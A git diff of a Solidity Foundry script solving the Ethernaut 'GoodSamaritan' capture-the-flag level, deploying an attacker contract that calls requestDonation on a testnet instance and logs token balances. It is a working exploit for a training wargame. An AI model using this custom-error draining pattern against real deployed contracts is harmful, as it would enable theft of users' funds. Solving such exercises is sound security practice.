@@ -1,33 +1,30 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.0;
 
-import "forge-std/Test.sol";
+import "forge-std/Script.sol";
 import "../src/levels/27-GoodSamaritan/GoodSamaritan.sol";
 
-contract ContractTest is Test {
+contract ExploitScript is Script {
     BadSamaritan BadSamaritanContract;
-    GoodSamaritan level27 = GoodSamaritan(payable(0xf67f52961F2b5a026CE96c3ffaabe0CF1Baa8006));
+    GoodSamaritan level27 = GoodSamaritan(payable(0x907657CAB582702A7d697826Eda09677AF359afa));
 
-    function setUp() public {
-    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
-    vm.createSelectFork(vm.rpcUrl("sepolia"));
-    BadSamaritanContract = new BadSamaritan();
-    }
-
-    function testExploit27() public {
+    function run() public {
+        vm.startBroadcast();
+        BadSamaritanContract = new BadSamaritan();
         console.log(level27.coin().balances(address(level27.wallet())));
         BadSamaritanContract.attax();
         console.log(level27.coin().balances(address(level27.wallet())));
         console.log(level27.coin().balances(address(BadSamaritanContract)));
+
+        vm.stopBroadcast();
     }
-  receive() external payable {}
 }
 
 contract BadSamaritan {
 
     error NotEnoughBalance();
 
-    GoodSamaritan goodsamaritan  = GoodSamaritan(0xf67f52961F2b5a026CE96c3ffaabe0CF1Baa8006); //ethernaut instance address
+    GoodSamaritan goodsamaritan  = GoodSamaritan(0x907657CAB582702A7d697826Eda09677AF359afa); //ethernaut instance address
     function attax() external {
         goodsamaritan.requestDonation();
     }
